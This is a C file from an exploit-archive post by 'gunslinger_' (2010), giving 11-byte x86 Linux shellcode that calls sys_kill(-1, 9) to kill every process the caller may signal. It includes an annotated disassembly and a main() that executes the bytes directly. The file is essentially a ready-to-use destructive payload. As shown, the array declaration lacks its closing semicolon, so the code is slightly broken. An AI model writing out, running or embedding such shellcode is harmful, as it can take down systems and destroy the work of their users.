/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : kill all running process
Name   : 11 bytes sys_kill(-1,9) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : ubuntu linux
*/
#include <stdio.h>

char *killer=
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x25"                    /* mov    $0x25,%al */
 "\x6a\xff"                    /* push   $0xffffffff */
 "\x5b"                        /* pop    %ebx */
 "\xb1\x09"                    /* mov    $0x9,%cl */
 "\xcd\x80"                    /* int    $0x80 */


int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(killer));
		((void (*)(void)) killer)();
		return 0;
}